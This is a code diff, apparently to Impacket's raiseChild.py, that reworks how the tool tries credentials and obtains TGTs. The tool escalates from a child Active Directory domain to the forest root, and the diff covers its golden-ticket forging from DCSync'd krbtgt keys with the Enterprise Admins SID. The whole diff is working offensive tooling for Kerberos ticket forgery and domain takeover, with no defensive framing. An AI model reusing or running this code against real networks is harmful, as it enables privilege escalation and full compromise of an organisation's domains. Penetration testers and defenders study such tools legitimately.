@@ -1136,8 +1136,10 @@ class RAISECHILD:
             credAttempts.append(('AES', {'lmhash': '', 'nthash': '', 'aesKey': childCreds['aesKey']}))
         if childCreds['nthash'] != '':
             credAttempts.append(('RC4', {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}))
-        if not credAttempts:
+        if childCreds['password'] != '':
             credAttempts.append(('password', {'lmhash': b'', 'nthash': b'', 'aesKey': None}))
+        if not credAttempts:
+            raise Exception('No credentials provided')
 
         tgt = cipher = oldSessionKey = sessionKey = None
         for credType, cred in credAttempts:
@@ -1161,13 +1163,17 @@ class RAISECHILD:
         # Track which krbtgt key type we're using for golden ticket forging
         # Start with RC4, fall back to AES from DCSync'd krbtgt creds if available
         goldenKeyAttempts = []
-        goldenKeyAttempts.append(('RC4', credentials['nthash'], credentials['aesKey']))
-        if credentials['aesKey'] and credentials['aesKey'] != b'':
-            goldenKeyAttempts.append(('AES', credentials['nthash'], credentials['aesKey']))
+        goldenKeyAttempts.append(('RC4', credentials['nthash'], credentials['aesKey'],
+                                  {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}))
+        if credentials['aesKey'] and credentials['aesKey'] != b'' and childCreds['aesKey'] is not None:
+            goldenKeyAttempts.append(('AES', credentials['nthash'], credentials['aesKey'],
+                                      {'lmhash': '', 'nthash': '', 'aesKey': childCreds['aesKey']}))
 
-        for goldenKeyType, ntHash, aesKey in goldenKeyAttempts:
-            # Re-obtain TGT for each attempt since makeGolden consumes it
-            tgt2, cipher2, oldSessionKey2, sessionKey2 = tgt, cipher, oldSessionKey, sessionKey
+        for goldenKeyType, ntHash, aesKey, childCred in goldenKeyAttempts:
+            # Re-obtain TGT with matching enctype for this golden ticket attempt
+            tgt2, cipher2, oldSessionKey2, sessionKey2 = getKerberosTGT(
+                userName, childCreds['password'], childCreds['domain'],
+                childCred['lmhash'], childCred['nthash'], childCred['aesKey'], self.__kdcHost)
             goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt2, cipher2, sessionKey2, ntHash,
                                                                            aesKey, entepriseSid + '-519')
             TGT['KDC_REP'] = goldenTicket
